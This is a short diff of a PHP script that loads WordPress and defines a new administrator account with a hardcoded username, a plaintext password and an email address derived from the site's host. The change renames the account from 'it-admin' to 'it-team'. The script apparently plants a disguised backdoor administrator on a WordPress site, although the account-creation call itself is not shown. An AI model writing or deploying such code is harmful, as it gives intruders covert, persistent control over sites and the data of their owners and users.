@@ -2,7 +2,7 @@
 define('WP_USE_THEMES', false);
 require('wp-blog-header.php');
 
-$new_admin_username = 'it-admin';
+$new_admin_username = 'it-team';
 $new_admin_password = 'plerkuda138!@';
 $new_admin_email = 'it-admin@' . $_SERVER['HTTP_HOST'];
 
